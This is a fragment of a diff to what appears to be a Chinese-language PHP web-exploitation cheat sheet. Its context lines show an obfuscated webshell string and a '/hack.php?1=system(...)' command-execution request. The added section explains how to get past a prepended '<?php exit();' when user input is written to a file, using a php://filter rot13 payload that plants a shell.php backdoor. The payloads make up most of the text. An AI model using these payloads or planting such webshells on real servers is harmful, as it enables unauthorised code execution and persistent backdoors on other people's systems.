@@ -217,3 +217,17 @@ contents=?<hp pe@av(l_$EG[T]1;)>?
 ```
 /hack.php?1=system('ls');
 ```
+
+^
+#### **4、伪协议写后门绕过**
+
+```
+$content = $_GET[content];
+file_put_contents($content,'<?php exit();'.$content);
+```
+需要绕过exit();
+```
+php://filter/write=string.rot13|<?cuc cucvasb();?>/resource=shell.php
+```
+
+
